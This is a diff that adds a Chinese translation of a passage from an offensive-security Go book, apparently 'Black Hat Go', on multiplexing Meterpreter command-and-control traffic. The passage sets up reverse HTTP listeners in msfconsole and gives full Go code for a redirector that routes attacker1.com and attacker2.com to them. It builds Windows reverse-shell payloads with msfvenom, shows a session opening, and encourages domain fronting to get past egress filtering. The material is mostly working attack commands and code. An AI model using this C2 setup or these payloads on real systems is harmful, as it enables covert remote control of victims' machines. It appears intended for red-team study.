@@ -665,7 +665,128 @@ From 127.0.0.1:58438: d
 
 有几种方式可以改善代码。第一，可以把日志输出到文件中或其他持久存储中，而不是在终端输出。这样就不会在终端关闭或服务重启后丢失数据。此外，如果同时记录多个客户端的按键，输出的数据将会混淆，这可能会使拼凑特定用户的凭证变得困难。可以使用更好的方式来避免这种情况，例如，根据唯一的客户端/端口源将键击分组。
 
-凭证收集这一部分到这就完成了。我们将通过介绍多路复用HTTP命令和控制连接来结束本章。
+凭证收集这一部分到这就完成了。我们将通过介绍多路复用HTTP的命令和控制连接来结束本章。
+
+## 多路复用C2
+
+这是HTTP服务器章节的最后一部分。在这里将了解如何将Meterpreter HTTP连接多路复用到不同的后端控制服务器。*Meterpreter* 是Metasploit开发框架中流行的，灵活的命令与控制（C2）套件。我们不会过多的介绍Metasploit或Meterpreter的细节。对于新手的话，最好通读下网站上的教程或文档。
+
+在本节中，将介绍如何在Go中创建反向HTTP代理，以便能根据Host的HTTP报头（这是虚拟网站托管的工作方式）来动态路由收到的session。但是，把代理连接到不同的Meterpreter监听器，而不是提供不同的本地文件和目录。这是一个有趣的用例，原因如下。
+
+首先，代理充当重定向器，这样就可以只公开该域名和IP地址，而不公开Metasploit监听器。如果重定向器被拉黑，可以简单地移除掉，而不用动C2服务器。第二，可以扩展这里的概念来执行 *domain fronting*，是一种利用信任的第三方域名（通常来自云提供商）绕过限制性出口控制的一种技术。我们不会在这里讨论一个完整的例子，但还是强烈建议深入研究下，因为它非常有用，能退出受限制的网络。最后，使用例子来演示如何在可能攻击不同目标组织的联合团队之间共享单个主机/端口组合。由于端口80和443是最可能允许访问的端口，可以让代理监听这些端口，并智能地将链接路由到正确的监听器。
+
+这是计划。设置两个单独的Meterpreter反向HTTP侦听器。在本例中个，它们安装在IP地址为10.0.1.20的虚拟机中，但是它们很可能存在于不同的主机上。将监听器分别绑定到10080 到 20080端口。在真实的情况下，这些监听器可以运行在任何地方，只要代理能访问到这些端口。确保已经安装了Metasploit(在Kali Linux上是预先安装了的)；然后启动监听器：
+
+```shell script
+$ msfconsole
+> use exploit/multi/handler
+> set payload windows/meterpreter_reverse_http
+> set LHOST 10.0.1.20 > set LPORT 80
+> set ReverseListenerBindAddress 10.0.1.20 > set ReverseListenerBindPort 10080
+> exploit -j -z
+[*] Exploit running as background job 1.
+
+[*] Started HTTP reverse handler on http://10.0.1.20:10080
+```
+
+当启动监听器时，提供代理数据作为 `LHOST` 和 `LPORT` 的值。然而，设置高级选项 `ReverseListenerBindAddress` 和 `ReverseListenerBindPort` 为监听器启动的真实的IP和端口，这为提供了一些端口使用的灵活性，同时允许明确地标识出代理主机——可以是主机名，例如，设置为域前置。
+
+在第二个Metasploit实例中，执行类似的操作，在端口20080上启动一个额外的监听器。真正唯一不一样的地方是绑定了不同的端口：
+
+```shell script
+$ msfconsole
+> use exploit/multi/handler
+> set payload windows/meterpreter_reverse_http > set LHOST 10.0.1.20
+> set LPORT 80
+> set ReverseListenerBindAddress 10.0.1.20
+> set ReverseListenerBindPort 20080
+> exploit -j -z
+[*] Exploit running as background job 1.
+
+[*] Started HTTP reverse handler on http://10.0.1.20:20080
+```
+
+现在来创建反向代理。代码4-10是完整的代码。
+
+```go
+package main
+
+import (
+	"log"
+	"net/http"
+	"net/http/httputil"
+	"net/url"
+
+	"github.com/gorilla/mux"
+)
+
+var (
+	hostProxy = make(map[string]string)
+	proxies   = make(map[string]*httputil.ReverseProxy)
+)
+
+func init() {
+	hostProxy["attacker1.com"] = "http://10.0.1.20:10080"
+	hostProxy["attacker2.com"] = "http://10.0.1.20:20080"
+
+	for k, v := range hostProxy {
+		remote, err := url.Parse(v)
+		if err != nil {
+			log.Fatal("Unable to parse proxy target")
+		}
+		proxies[k] = httputil.NewSingleHostReverseProxy(remote)
+	}
+}
+
+func main() {
+	r := mux.NewRouter()
+	for host, proxy := range proxies {
+		r.Host(host).Handler(proxy)
+	}
+	log.Fatal(http.ListenAndServe(":80", r))
+}
+```
+
+代码 4-10: 多路复用 Meterpreter (https://github.com/blackhat-go/bhg/ch-4/multiplexer/main.go/)
+
+首先注意的是导入 `net/http/httputil` 包，其含有帮助创建反向代理的功能。这样就不用从头开始创建了。
+
+导入包后，定义了一对map类型的变量。先使用第一个 `hostProxy` 将主机名映射到Metasploit监听器的URL，希望将该主机名路由到该监听器。记住，基于代理在HTTP请求中收到的Host报头。维护该映射是确定目标的一种简单方法。
+
+定义的第二个变量 `proxies` 也使用主机名作为key。然而，map中相应的值为 `*httputil .ReverseProxy` 类型的实例。也就是路由到的真实的代理实例，而不是目标的字符串形式。
+
+注意点硬编码了这些信息，这不是管理配置和代理数据的最优雅方式。更好的方式是将这些信息存储在外部的配置文件中。
+
+使用 `init() ` 函数来定义域名和目标Metasploit实例之间的映射。本例中，将所有Host报头值为 `attacker1.com` 的请求路由到 `http://10.0.1.20 :10080`，将所有Host报头值为 `attacker2.com` 的请求路由到 `http://10.0.1.20 :20080。当然，实际上还没有执行路由；这仅创建了基本的配置。注意，这些地址对应于之前为Meterpreter监听器使用的ReverseListenerBindAddress和ReverseListenerBindPort值。
+
+接下来，仍然在 `init() ` 函数中，循环遍历 ` hostProxy` map，解析终点地址来创建 `net.URL` 实例。调用 `httputil.NewSingleHostReverseProxy (net.URL)` 时将该实例传入，该函数是从URL创建反向代理的辅助函数。更好的是，`httputil.ReverseProxy` 类型符合 `http.Handler` 实例，也就是可以使用创建的代理实例作为路由的处理函数。在 `main()` 函数中，创建路由，然后循环遍历所有的代理实例。回想下该map的键为主机名，值是 `httputil.ReverseProxy` 类型。对于map中的每一对 key/value，在路由上添加匹配函数。Gorilla MUX工具包的路由类型包含一个名为Host的匹配函数，该函数接受一个主机名来匹配传入请求中的Host 报头。对于每一个要检查的主机名，告诉路由使用相应的代理。对于一个复杂的问题来说，这是一个非常简单的解决方案。
+
+通过启动服务来完成程序，绑定到80端口。保存并启动该程序。由于绑定到特别的端口，因此需要作为特别的用户执行此操作。
+
+至此，已经有了两个正在运行的Meterpreter反向HTTP监听器，现在也应该有一个运行中的反向代理。最后一步是生成测试来检验代理是否工作。使用和Metasploit一起发布的负载生成工具 `msfvenom` ，来生成一对Windows可执行文件:
+
+```shell script
+$ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20 LPORT=80 HttpHostHeader=attacker1.com -f exe -o payload1.exe
+$ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20 LPORT=80 HttpHostHeader=attacker2.com -f exe -o payload2.exe
+```
+
+生成了两个文件：*payload1.exe* 和 *payload2.exe 。请注意，除了文件名之外，两者之间的惟一区别是 `HttpHostHeader` 值。这确保产生的负载使用特定的Host报头发送HTTP请求。也要注意，LHOST 和 LPORT 的值对应于反向代理的信息，而不是Meterpreter监听器。将生成的可执行文件传输到Windows系统或虚拟机。当执行该文件时，会有两个新的 sessions 创建：一个绑定在10080端口的监听器，一个是绑定在20080端口的监听器。应该是下面这样：
+
+```shell script
+>
+[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk) Redirecting stageless connection from /pxS_2gL43lv34_birNgRHgL4AJ3A9w3i9FXG3Ne2-3UdLhACr8-Qt6QOlOw PTkzww3NEptWTOan2rLo5RT42eOdhYykyPYQy8dq3Bq3Mi2TaAEB with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0;
+rv:11.0) like Gecko'
+[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk) Attaching orphaned/stageless session...
+[*] Meterpreter session 1 opened (10.0.1.20:10080 -> 10.0.1.20:60226) at 2020-07-03 16:13:34 -0500
+```
+
+如果使用tcpdump或Wireshark查看发送到端口10080或20080的网络流量，应该看到，反向代理是与Metasploit监听器通信的唯一主机。还可以确认Host报头被适当地设置为 `attacker1.com` （用于端口10080上的监听器）和 `attacker2.com` （用于端口20080上的监听器）。
+
+就是这样。做到了！现在提高一点。作为练习，我们建议您更新代码以使用分段的负载。这可能会有额外的挑战，因为需要确保这两个阶段都正确地路由到代理。此外，尝试通过使用HTTPS而不是明文的 HTTP来实现。这将提高您在以有用、恶意的方式在代理流量方面的理解和有效性。
+
+
+
+
 
 
 
